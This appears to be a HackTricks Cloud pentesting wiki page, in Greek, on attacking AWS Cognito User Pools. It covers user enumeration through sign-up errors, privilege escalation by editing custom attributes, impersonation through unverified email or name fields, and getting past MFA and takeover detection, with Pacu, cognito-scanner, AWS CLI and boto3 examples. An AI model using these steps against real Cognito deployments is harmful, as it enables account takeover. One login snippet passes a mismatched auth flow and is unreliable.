# Cognito User Pools

{% hint style="success" %}
Μάθετε και εξασκηθείτε στο AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Μάθετε και εξασκηθείτε στο GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστηρίξτε το HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Γίνετε μέλος της** 💬 [**ομάδας Discord**](https://discord.gg/hRep4RUj7f) ή της [**ομάδας telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε hacking tricks υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια στο github.

</details>
{% endhint %}

## Βασικές Πληροφορίες

Μια user pool είναι ένας κατάλογος χρηστών στο Amazon Cognito. Με μια user pool, οι χρήστες σας μπορούν να **συνδεθούν στην web ή mobile εφαρμογή σας** μέσω του Amazon Cognito, **ή να συνδεθούν** μέσω ενός **τρίτου** παρόχου ταυτότητας (IdP). Είτε οι χρήστες σας συνδέονται απευθείας είτε μέσω τρίτου, όλα τα μέλη της user pool έχουν ένα προφίλ καταλόγου που μπορείτε να έχετε πρόσβαση μέσω ενός SDK.

Οι user pools παρέχουν:

* Υπηρεσίες εγγραφής και σύνδεσης.
* Ένα ενσωματωμένο, προσαρμόσιμο web UI για τη σύνδεση χρηστών.
* Κοινωνική σύνδεση με Facebook, Google, Login with Amazon, και Sign in with Apple, και μέσω παρόχων ταυτότητας SAML και OIDC από την user pool σας.
* Διαχείριση καταλόγου χρηστών και προφίλ χρηστών.
* Χαρακτηριστικά ασφαλείας όπως πολυπαραγοντική αυθεντικοποίηση (MFA), έλεγχοι για παραβιασμένα διαπιστευτήρια, προστασία από κατάληψη λογαριασμού, και επαλήθευση τηλεφώνου και email.
* Προσαρμοσμένες ροές εργασίας και μετανάστευση χρηστών μέσω AWS Lambda triggers.

Ο **πηγαίος κώδικας** των εφαρμογών θα περιέχει συνήθως επίσης το **user pool ID** και το **client application ID**, (και μερικές φορές το **application secret**;) που είναι απαραίτητα για έναν **χρήστη να συνδεθεί** σε μια Cognito User Pool.

### Πιθανές επιθέσεις

* **Εγγραφή**: Από προεπιλογή, ένας χρήστης μπορεί να εγγραφεί μόνος του, οπότε θα μπορούσε να δημιουργήσει έναν χρήστη για τον εαυτό του.
* **Απαρίθμηση χρηστών**: Η λειτουργία εγγραφής μπορεί να χρησιμοποιηθεί για να βρεθούν ονόματα χρηστών που ήδη υπάρχουν. Αυτή η πληροφορία μπορεί να είναι χρήσιμη για την επίθεση brute-force.
* **Login brute-force**: Στην ενότητα [**Authentication**](cognito-user-pools.md#authentication) έχετε όλες τις **μεθόδους** που ένας χρήστης έχει για να **συνδεθεί**, θα μπορούσατε να προσπαθήσετε να τις brute-force για να **βρείτε έγκυρα διαπιστευτήρια**.

### Εργαλεία για pentesting

* [Pacu](https://github.com/RhinoSecurityLabs/pacu), το AWS exploitation framework, τώρα περιλαμβάνει τα modules "cognito\_\_enum" και "cognito\_\_attack" που αυτοματοποιούν την απαρίθμηση όλων των Cognito assets σε έναν λογαριασμό και επισημαίνουν αδύναμες διαμορφώσεις, χαρακτηριστικά χρηστών που χρησιμοποιούνται για έλεγχο πρόσβασης, κ.λπ., και επίσης αυτοματοποιούν τη δημιουργία χρηστών (συμπεριλαμβανομένης της υποστήριξης MFA) και την κλιμάκωση προνομίων βάσει τροποποιήσιμων προσαρμοσμένων χαρακτηριστικών, χρησιμοποιήσιμων διαπιστευτηρίων identity pool, αναλαμβανόμενων ρόλων σε id tokens, κ.λπ.

Για μια περιγραφή των λειτουργιών των modules δείτε το μέρος 2 του [blog post](https://rhinosecuritylabs.com/aws/attacking-aws-cognito-with-pacu-p2). Για οδηγίες εγκατάστασης δείτε την κύρια σελίδα του [Pacu](https://github.com/RhinoSecurityLabs/pacu).

#### Χρήση

Δείγμα χρήσης του cognito\_\_attack για προσπάθεια δημιουργίας χρήστη και όλων των privesc vectors σε μια δεδομένη identity pool και user pool client:
```bash
Pacu (new:test) > run cognito__attack --username randomuser --email XX+sdfs2@gmail.com --identity_pools
us-east-2:a06XXXXX-c9XX-4aXX-9a33-9ceXXXXXXXXX --user_pool_clients
59f6tuhfXXXXXXXXXXXXXXXXXX@us-east-2_0aXXXXXXX
```
Δείγμα χρήσης του cognito\_\_enum για τη συλλογή όλων των user pools, user pool clients, identity pools, χρηστών, κ.λπ. που είναι ορατά στον τρέχοντα λογαριασμό AWS:
```bash
Pacu (new:test) > run cognito__enum
```
* [Cognito Scanner](https://github.com/padok-team/cognito-scanner) is a CLI tool in python that implements different attacks on Cognito including unwanted account creation and account oracle.

#### Εγκατάσταση
```bash
$ pip install cognito-scanner
```
#### Χρήση
```bash
$ cognito-scanner --help
```
Για περισσότερες πληροφορίες ελέγξτε https://github.com/padok-team/cognito-scanner

## Registration

User Pools επιτρέπει από **προεπιλογή** την **εγγραφή νέων χρηστών**.
```bash
aws cognito-idp sign-up --client-id <client-id> \
--username <username> --password <password> \
--region <region> --no-sign-request
```
#### Αν μπορεί να εγγραφεί οποιοσδήποτε

Μπορεί να βρείτε ένα σφάλμα που σας υποδεικνύει ότι πρέπει να **παρέχετε περισσότερες λεπτομέρειες** σχετικά με τον χρήστη:
```
An error occurred (InvalidParameterException) when calling the SignUp operation: Attributes did not conform to the schema: address: The attribute is required
```
Μπορείτε να παρέχετε τις απαραίτητες λεπτομέρειες με ένα JSON όπως:
```json
--user-attributes '[{"Name": "email", "Value": "carlospolop@gmail.com"}, {"Name":"gender", "Value": "M"}, {"Name": "address", "Value": "street"}, {"Name": "custom:custom_name", "Value":"supername&\"*$"}]'
```
Μπορείτε να χρησιμοποιήσετε αυτή τη λειτουργία επίσης για να **καταμετρήσετε υπάρχοντες χρήστες.** Αυτό είναι το μήνυμα σφάλματος όταν ένας χρήστης ήδη υπάρχει με αυτό το όνομα:
```
An error occurred (UsernameExistsException) when calling the SignUp operation: User already exists
```
{% hint style="info" %}
Σημειώστε στην προηγούμενη εντολή πώς οι **προσαρμοσμένες ιδιότητες ξεκινούν με "custom:"**.\
Επίσης, γνωρίζετε ότι κατά την εγγραφή **δεν μπορείτε να δημιουργήσετε νέες προσαρμοσμένες ιδιότητες για τον χρήστη**. Μπορείτε μόνο να δώσετε τιμή στις **προεπιλεγμένες ιδιότητες** (ακόμα και αν δεν είναι απαραίτητες) και στις **προσαρμοσμένες ιδιότητες που έχουν καθοριστεί**.
{% endhint %}

Ή απλά για να δοκιμάσετε αν υπάρχει ένα client id. Αυτό είναι το σφάλμα αν το client-id δεν υπάρχει:
```
An error occurred (ResourceNotFoundException) when calling the SignUp operation: User pool client 3ig612gjm56p1ljls1prq2miut does not exist.
```
#### If only admin can register users

Θα βρείτε αυτό το σφάλμα και δεν θα μπορείτε να καταχωρίσετε ή να απαριθμήσετε χρήστες:
```
An error occurred (NotAuthorizedException) when calling the SignUp operation: SignUp is not permitted for this user pool
```
### Verifying Registration

Το Cognito επιτρέπει την **επαλήθευση ενός νέου χρήστη επαληθεύοντας το email ή τον αριθμό τηλεφώνου του**. Επομένως, κατά τη δημιουργία ενός χρήστη συνήθως θα απαιτείται τουλάχιστον το όνομα χρήστη και ο κωδικός πρόσβασης και το **email και/ή ο αριθμός τηλεφώνου**. Απλά ορίστε ένα **που ελέγχετε** ώστε να λάβετε τον κωδικό για να **επαληθεύσετε τον** νεοδημιουργημένο λογαριασμό **χρήστη** σας όπως αυτό:
```bash
aws cognito-idp confirm-sign-up --client-id <cliet_id> \
--username aasdasd2 --confirmation-code <conf_code> \
--no-sign-request --region us-east-1
```
{% hint style="warning" %}
Ακόμα κι αν **φαίνεται ότι μπορείτε να χρησιμοποιήσετε το ίδιο email** και αριθμό τηλεφώνου, όταν χρειαστεί να επαληθεύσετε τον δημιουργημένο χρήστη, το Cognito θα παραπονεθεί για τη χρήση των ίδιων πληροφοριών και **δεν θα σας επιτρέψει να επαληθεύσετε τον λογαριασμό**.
{% endhint %}

### Privilege Escalation / Ενημέρωση Χαρακτηριστικών

Από προεπιλογή, ένας χρήστης μπορεί **να τροποποιήσει την τιμή των χαρακτηριστικών του** με κάτι σαν:
```bash
aws cognito-idp update-user-attributes \
--region us-east-1 --no-sign-request \
--user-attributes Name=address,Value=street \
--access-token <access token>
```
#### Custom attribute privesc

{% hint style="danger" %}
Μπορεί να βρείτε **custom attributes** που χρησιμοποιούνται (όπως `isAdmin`), καθώς από προεπιλογή μπορείτε να **αλλάξετε τις τιμές των δικών σας attributes** και ίσως να μπορέσετε να **κλιμακώσετε προνόμια** αλλάζοντας την τιμή μόνοι σας!
{% endhint %}

#### Email/username modification privesc

Μπορείτε να χρησιμοποιήσετε αυτό για να **τροποποιήσετε το email και τον αριθμό τηλεφώνου** ενός χρήστη, αλλά τότε, ακόμα και αν ο λογαριασμός παραμένει ως επαληθευμένος, αυτά τα attributes είναι **σε κατάσταση μη επαληθευμένη** (πρέπει να τα επαληθεύσετε ξανά).

{% hint style="warning" %}
Δεν θα μπορείτε να συνδεθείτε με email ή αριθμό τηλεφώνου μέχρι να τα επαληθεύσετε, αλλά θα μπορείτε να **συνδεθείτε με το username**.\
Σημειώστε ότι ακόμα και αν το email τροποποιήθηκε και δεν επαληθεύτηκε, θα εμφανιστεί στο ID Token μέσα στο **`email`** **field** και το field **`email_verified`** θα είναι **false**, αλλά αν η εφαρμογή **δεν το ελέγχει, μπορεί να υποδυθείτε άλλους χρήστες**.

Επιπλέον, σημειώστε ότι μπορείτε να βάλετε οτιδήποτε μέσα στο **`name`** field απλά τροποποιώντας το **name attribute**. Αν μια εφαρμογή **ελέγχει** **αυτό** το field για κάποιο λόγο **αντί για το `email`** (ή οποιοδήποτε άλλο attribute) μπορεί να μπορέσετε να **υποδυθείτε άλλους χρήστες**.
{% endhint %}

Πάντως, αν για κάποιο λόγο αλλάξατε το email σας για παράδειγμα σε ένα νέο που μπορείτε να έχετε πρόσβαση, μπορείτε να **επιβεβαιώσετε το email με τον κωδικό που λάβατε σε αυτή τη διεύθυνση email**:
```bash
aws cognito-idp verify-user-attribute \
--access-token <access_token> \
--attribute-name email --code <code> \
--region <region> --no-sign-request
```
Use **`phone_number`** instead of **`email`** to change/verify a **new phone number**.

{% hint style="info" %}
Ο διαχειριστής θα μπορούσε επίσης να ενεργοποιήσει την επιλογή για **σύνδεση με το προτιμώμενο όνομα χρήστη**. Σημειώστε ότι δεν θα μπορείτε να αλλάξετε αυτήν την τιμή σε **οποιοδήποτε όνομα χρήστη ή preferred\_username που ήδη χρησιμοποιείται** για να υποδυθείτε έναν διαφορετικό χρήστη.
{% endhint %}

### Ανάκτηση/Αλλαγή Κωδικού

Είναι δυνατόν να ανακτήσετε έναν κωδικό απλά **γνωρίζοντας το όνομα χρήστη** (ή το email ή το τηλέφωνο είναι αποδεκτά) και έχοντας πρόσβαση σε αυτό καθώς θα σταλεί εκεί ένας κωδικός:
```bash
aws cognito-idp forgot-password \
--client-id <client_id> \
--username <username/email/phone> --region <region>
```
{% hint style="info" %}
Η απάντηση του διακομιστή θα είναι πάντα θετική, σαν να υπήρχε το όνομα χρήστη. Δεν μπορείτε να χρησιμοποιήσετε αυτή τη μέθοδο για να απαριθμήσετε χρήστες
{% endhint %}

Με τον κώδικα μπορείτε να αλλάξετε τον κωδικό πρόσβασης με:
```bash
aws cognito-idp confirm-forgot-password \
--client-id <client_id> \
--username <username> \
--confirmation-code <conf_code> \
--password <pwd> --region <region>
```
Για να αλλάξετε τον κωδικό πρόσβασης πρέπει να **γνωρίζετε τον προηγούμενο κωδικό πρόσβασης**:
```bash
aws cognito-idp change-password \
--previous-password <value> \
--proposed-password <value> \
--access-token <value>
```
## Authentication

Μια δεξαμενή χρηστών υποστηρίζει **διαφορετικούς τρόπους αυθεντικοποίησης** σε αυτήν. Εάν έχετε ένα **όνομα χρήστη και κωδικό πρόσβασης**, υπάρχουν επίσης **διαφορετικές μέθοδοι** που υποστηρίζονται για σύνδεση.\
Επιπλέον, όταν ένας χρήστης αυθεντικοποιείται στη δεξαμενή, **δίνονται 3 τύποι διακριτικών**: Το **ID Token**, το **Access token** και το **Refresh token**.

* [**ID Token**](https://docs.aws.amazon.com/cognito/latest/developerguide/amazon-cognito-user-pools-using-the-id-token.html): Περιέχει ισχυρισμούς σχετικά με την **ταυτότητα του αυθεντικοποιημένου χρήστη**, όπως `name`, `email`, και `phone_number`. Το ID token μπορεί επίσης να χρησιμοποιηθεί για **αυθεντικοποίηση χρηστών στους διακομιστές πόρων ή στις εφαρμογές διακομιστή σας**. Πρέπει να **επαληθεύσετε** την **υπογραφή** του ID token πριν εμπιστευτείτε οποιονδήποτε ισχυρισμό μέσα στο ID token εάν το χρησιμοποιείτε σε εξωτερικές εφαρμογές.
* Το ID Token είναι το διακριτικό που **περιέχει τις τιμές των χαρακτηριστικών του χρήστη**, ακόμη και τα προσαρμοσμένα.
* [**Access Token**](https://docs.aws.amazon.com/cognito/latest/developerguide/amazon-cognito-user-pools-using-the-access-token.html): Περιέχει ισχυρισμούς σχετικά με τον αυθεντικοποιημένο χρήστη, μια λίστα με τις **ομάδες του χρήστη και μια λίστα με πεδία**. Ο σκοπός του access token είναι να **εξουσιοδοτεί τις λειτουργίες API** στο πλαίσιο του χρήστη στη δεξαμενή χρηστών. Για παράδειγμα, μπορείτε να χρησιμοποιήσετε το access token για να **παραχωρήσετε στον χρήστη σας πρόσβαση** για να προσθέσει, να αλλάξει ή να διαγράψει χαρακτηριστικά χρήστη.
* [**Refresh Token**](https://docs.aws.amazon.com/cognito/latest/developerguide/amazon-cognito-user-pools-using-the-refresh-token.html): Με τα refresh tokens μπορείτε να **λάβετε νέα ID Tokens και Access Tokens** για τον χρήστη μέχρι να **γίνει άκυρο το refresh token**. Από **προεπιλογή**, το refresh token **λήγει 30 ημέρες μετά** την είσοδο του χρήστη της εφαρμογής σας στη δεξαμενή χρηστών σας. Όταν δημιουργείτε μια εφαρμογή για τη δεξαμενή χρηστών σας, μπορείτε να ορίσετε τη λήξη του refresh token της εφαρμογής σε **οποιαδήποτε τιμή μεταξύ 60 λεπτών και 10 ετών**.

### ADMIN\_NO\_SRP\_AUTH & ADMIN\_USER\_PASSWORD\_AUTH

Αυτή είναι η ροή αυθεντικοποίησης από την πλευρά του διακομιστή:

* Η εφαρμογή από την πλευρά του διακομιστή καλεί τη λειτουργία API **`AdminInitiateAuth`** (αντί για `InitiateAuth`). Αυτή η λειτουργία απαιτεί διαπιστευτήρια AWS με δικαιώματα που περιλαμβάνουν **`cognito-idp:AdminInitiateAuth`** και **`cognito-idp:AdminRespondToAuthChallenge`**. Η λειτουργία επιστρέφει τις απαιτούμενες παραμέτρους αυθεντικοποίησης.
* Αφού η εφαρμογή από την πλευρά του διακομιστή έχει τις **παραμέτρους αυθεντικοποίησης**, καλεί τη λειτουργία API **`AdminRespondToAuthChallenge`**. Η λειτουργία API `AdminRespondToAuthChallenge` επιτυγχάνει μόνο όταν παρέχετε διαπιστευτήρια AWS.

Αυτή η **μέθοδος ΔΕΝ είναι ενεργοποιημένη** από προεπιλογή.

Για να **συνδεθείτε** χρειάζεστε να γνωρίζετε:

* user pool id
* client id
* username
* password
* client secret (μόνο εάν η εφαρμογή είναι διαμορφωμένη να χρησιμοποιεί ένα μυστικό)

{% hint style="info" %}
Για να **μπορείτε να συνδεθείτε με αυτή τη μέθοδο**, η εφαρμογή πρέπει να επιτρέπει τη σύνδεση με `ALLOW_ADMIN_USER_PASSWORD_AUTH`.\
Επιπλέον, για να εκτελέσετε αυτήν την ενέργεια χρειάζεστε διαπιστευτήρια με τα δικαιώματα **`cognito-idp:AdminInitiateAuth`** και **`cognito-idp:AdminRespondToAuthChallenge`**
{% endhint %}
```python
aws cognito-idp admin-initiate-auth \
--client-id <client-id> \
--auth-flow ADMIN_USER_PASSWORD_AUTH \
--region <region> \
--auth-parameters 'USERNAME=<username>,PASSWORD=<password>,SECRET_HASH=<hash_if_needed>'
--user-pool-id "<pool-id>"

# Check the python code to learn how to generate the hsecret_hash
```
<details>

<summary>Κώδικας για Σύνδεση</summary>
```python
import boto3
import botocore
import hmac
import hashlib
import base64


client_id = "<client-id>"
user_pool_id = "<user-pool-id>"
client_secret = "<client-secret>"
username = "<username>"
password = "<pwd>"

boto_client = boto3.client('cognito-idp', region_name='us-east-1')

def get_secret_hash(username, client_id, client_secret):
key = bytes(client_secret, 'utf-8')
message = bytes(f'{username}{client_id}', 'utf-8')
return base64.b64encode(hmac.new(key, message, digestmod=hashlib.sha256).digest()).decode()

# If the Client App isn't configured to use a secret
## just delete the line setting the SECRET_HASH
def login_user(username_or_alias, password, client_id, client_secret, user_pool_id):
try:
return boto_client.admin_initiate_auth(
UserPoolId=user_pool_id,
ClientId=client_id,
AuthFlow='ADMIN_USER_PASSWORD_AUTH',
AuthParameters={
'USERNAME': username_or_alias,
'PASSWORD': password,
'SECRET_HASH': get_secret_hash(username_or_alias, client_id, client_secret)
}
)
except botocore.exceptions.ClientError as e:
return e.response

print(login_user(username, password, client_id, client_secret, user_pool_id))
```
</details>

### USER\_PASSWORD\_AUTH

Αυτή η μέθοδος είναι μια άλλη απλή και **παραδοσιακή ροή αυθεντικοποίησης χρήστη και κωδικού πρόσβασης**. Συνιστάται να **μεταφέρετε μια παραδοσιακή** μέθοδο αυθεντικοποίησης **στο Cognito** και **συνιστάται** στη συνέχεια να την **απενεργοποιήσετε** και να **χρησιμοποιήσετε** τη μέθοδο **ALLOW\_USER\_SRP\_AUTH** αντί αυτής (καθώς αυτή δεν στέλνει ποτέ τον κωδικό πρόσβασης μέσω του δικτύου).\
Αυτή η **μέθοδος ΔΕΝ είναι ενεργοποιημένη** από προεπιλογή.

Η κύρια **διαφορά** με την **προηγούμενη μέθοδο αυθεντικοποίησης** μέσα στον κώδικα είναι ότι **δεν χρειάζεται να γνωρίζετε το user pool ID** και ότι **δεν χρειάζεστε επιπλέον δικαιώματα** στο Cognito User Pool.

Για να **συνδεθείτε** χρειάζεται να γνωρίζετε:

* client id
* username
* password
* client secret (μόνο αν η εφαρμογή είναι ρυθμισμένη να χρησιμοποιεί secret)

{% hint style="info" %}
Για να **μπορείτε να συνδεθείτε με αυτή τη μέθοδο** η εφαρμογή πρέπει να επιτρέπει τη σύνδεση με ALLOW\_USER\_PASSWORD\_AUTH.
{% endhint %}
```python
aws cognito-idp initiate-auth  --client-id <client-id> \
--auth-flow USER_PASSWORD_AUTH --region <region> \
--auth-parameters 'USERNAME=<username>,PASSWORD=<password>,SECRET_HASH=<hash_if_needed>'

# Check the python code to learn how to generate the secret_hash
```
<details>

<summary>Κώδικας Python για Σύνδεση</summary>
```python
import boto3
import botocore
import hmac
import hashlib
import base64


client_id = "<client-id>"
user_pool_id = "<user-pool-id>"
client_secret = "<client-secret>"
username = "<username>"
password = "<pwd>"

boto_client = boto3.client('cognito-idp', region_name='us-east-1')

def get_secret_hash(username, client_id, client_secret):
key = bytes(client_secret, 'utf-8')
message = bytes(f'{username}{client_id}', 'utf-8')
return base64.b64encode(hmac.new(key, message, digestmod=hashlib.sha256).digest()).decode()

# If the Client App isn't configured to use a secret
## just delete the line setting the SECRET_HASH
def login_user(username_or_alias, password, client_id, client_secret, user_pool_id):
try:
return boto_client.initiate_auth(
ClientId=client_id,
AuthFlow='ADMIN_USER_PASSWORD_AUTH',
AuthParameters={
'USERNAME': username_or_alias,
'PASSWORD': password,
'SECRET_HASH': get_secret_hash(username_or_alias, client_id, client_secret)
}
)
except botocore.exceptions.ClientError as e:
return e.response

print(login_user(username, password, client_id, client_secret, user_pool_id))
```
</details>

### USER\_SRP\_AUTH

Αυτό το σενάριο είναι παρόμοιο με το προηγούμενο αλλά **αντί να στέλνεται ο κωδικός πρόσβασης** μέσω του δικτύου για σύνδεση, **εκτελείται έλεγχος ταυτότητας πρόκλησης** (οπότε κανένας κωδικός πρόσβασης δεν πλοηγείται, ακόμα και κρυπτογραφημένος, μέσω του δικτύου).\
Αυτή η **μέθοδος είναι ενεργοποιημένη** από προεπιλογή.

Για να **συνδεθείτε** χρειάζεστε να γνωρίζετε:

* user pool id
* client id
* username
* password
* client secret (μόνο αν η εφαρμογή είναι διαμορφωμένη να χρησιμοποιεί ένα μυστικό)

<details>

<summary>Κώδικας για σύνδεση</summary>
```python
from warrant.aws_srp import AWSSRP
import os

USERNAME='xxx'
PASSWORD='yyy'
POOL_ID='us-east-1_zzzzz'
CLIENT_ID = '12xxxxxxxxxxxxxxxxxxxxxxx'
CLIENT_SECRET = 'secreeeeet'
os.environ["AWS_DEFAULT_REGION"] = "<region>"

aws = AWSSRP(username=USERNAME, password=PASSWORD, pool_id=POOL_ID,
client_id=CLIENT_ID, client_secret=CLIENT_SECRET)
tokens = aws.authenticate_user()
id_token = tokens['AuthenticationResult']['IdToken']
refresh_token = tokens['AuthenticationResult']['RefreshToken']
access_token = tokens['AuthenticationResult']['AccessToken']
token_type = tokens['AuthenticationResult']['TokenType']
```
</details>

### REFRESH\_TOKEN\_AUTH & REFRESH\_TOKEN

Αυτή η **μέθοδος θα είναι πάντα έγκυρη** (δεν μπορεί να απενεργοποιηθεί) αλλά χρειάζεστε ένα έγκυρο refresh token.
```bash
aws cognito-idp initiate-auth \
--client-id 3ig6h5gjm56p1ljls1prq2miut \
--auth-flow REFRESH_TOKEN_AUTH \
--region us-east-1 \
--auth-parameters 'REFRESH_TOKEN=<token>'
```
<details>

<summary>Κώδικας για ανανέωση</summary>
```python
import boto3
import botocore
import hmac
import hashlib
import base64

client_id = "<client-id>"
token = '<token>'

boto_client = boto3.client('cognito-idp', region_name='<region>')

def refresh(client_id, refresh_token):
try:
return boto_client.initiate_auth(
ClientId=client_id,
AuthFlow='REFRESH_TOKEN_AUTH',
AuthParameters={
'REFRESH_TOKEN': refresh_token
}
)
except botocore.exceptions.ClientError as e:
return e.response


print(refresh(client_id, token))
```
</details>

### CUSTOM\_AUTH

Σε αυτή την περίπτωση η **αυθεντικοποίηση** θα πραγματοποιηθεί μέσω της **εκτέλεσης μιας lambda function**.

## Επιπλέον Ασφάλεια

### Προηγμένη Ασφάλεια

Από προεπιλογή είναι απενεργοποιημένη, αλλά αν ενεργοποιηθεί, το Cognito θα μπορούσε να **εντοπίσει καταλήψεις λογαριασμών**. Για να ελαχιστοποιήσετε την πιθανότητα, θα πρέπει να συνδεθείτε από ένα **δίκτυο μέσα στην ίδια πόλη, χρησιμοποιώντας τον ίδιο user agent** (και την ίδια IP αν είναι δυνατόν).

### **MFA Remember device**

Αν ο χρήστης συνδεθεί από την ίδια συσκευή, το MFA μπορεί να παρακαμφθεί, επομένως προσπαθήστε να συνδεθείτε από τον ίδιο browser με τα ίδια metadata (IP;) για να προσπαθήσετε να παρακάμψετε την προστασία MFA.

## User Pool Groups IAM Roles

Είναι δυνατόν να προσθέσετε **χρήστες σε ομάδες User Pool** που σχετίζονται με έναν **IAM ρόλο**.\
Επιπλέον, οι **χρήστες** μπορούν να ανατεθούν σε **περισσότερες από 1 ομάδα με διαφορετικούς IAM ρόλους** συνδεδεμένους.

Σημειώστε ότι ακόμα και αν μια ομάδα είναι μέσα σε μια ομάδα με έναν IAM ρόλο συνδεδεμένο, για να είναι δυνατή η πρόσβαση στα IAM credentials αυτής της ομάδας, είναι απαραίτητο το **User Pool να είναι αξιόπιστο από ένα Identity Pool** (και να γνωρίζει τις λεπτομέρειες αυτού του Identity Pool).

Ένα άλλο απαραίτητο στοιχείο για να αποκτήσετε τον **IAM ρόλο που υποδεικνύεται στο IdToken** όταν ένας χρήστης είναι αυθεντικοποιημένος στο User Pool (`aws cognito-idp initiate-auth...`) είναι ότι ο **Identity Provider Authentication provider** πρέπει να υποδεικνύει ότι ο **ρόλος πρέπει να επιλεγεί από το token.**

<figure><img src="../../../../.gitbook/assets/image (250).png" alt=""><figcaption></figcaption></figure>

Οι **ρόλοι** στους οποίους έχει πρόσβαση ένας χρήστης είναι **μέσα στο `IdToken`**, και ένας χρήστης μπορεί **να επιλέξει ποιον ρόλο θα ήθελε τα credentials** με το **`--custom-role-arn`** από το `aws cognito-identity get-credentials-for-identity`.\
Ωστόσο, αν η **προεπιλεγμένη επιλογή** είναι αυτή που **έχει ρυθμιστεί** (`use default role`), και προσπαθήσετε να αποκτήσετε πρόσβαση σε έναν ρόλο από το IdToken, θα λάβετε **σφάλμα** (γι' αυτό είναι απαραίτητη η προηγούμενη ρύθμιση):

{% code overflow="wrap" %}
```
An error occurred (InvalidParameterException) when calling the GetCredentialsForIdentity operation: Only SAML providers and providers with RoleMappings support custom role ARN.
```
{% endcode %}

{% hint style="warning" %}
Σημειώστε ότι ο ρόλος που έχει ανατεθεί σε μια **User Pool Group** πρέπει να είναι **προσβάσιμος από τον Identity Provider** που **εμπιστεύεται το User Pool** (καθώς τα **διαπιστευτήρια συνεδρίας του IAM ρόλου θα αποκτηθούν από αυτόν**).
{% endhint %}
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Effect": "Allow",
"Principal": {
"Federated": "cognito-identity.amazonaws.com"
},
"Action": "sts:AssumeRoleWithWebIdentity",
"Condition": {
"StringEquals": {
"cognito-identity.amazonaws.com:aud": "us-east-1:2361092e-9db6-a876-1027-10387c9de439"
},
"ForAnyValue:StringLike": {
"cognito-identity.amazonaws.com:amr": "authenticated"
}
}
}
]
}js
```
{% hint style="success" %}
Μάθετε & εξασκηθείτε στο AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Μάθετε & εξασκηθείτε στο GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστηρίξτε το HackTricks</summary>

* Δείτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Γίνετε μέλος της** 💬 [**ομάδας Discord**](https://discord.gg/hRep4RUj7f) ή της [**ομάδας telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε hacking tricks υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια στο github.

</details>
{% endhint %}
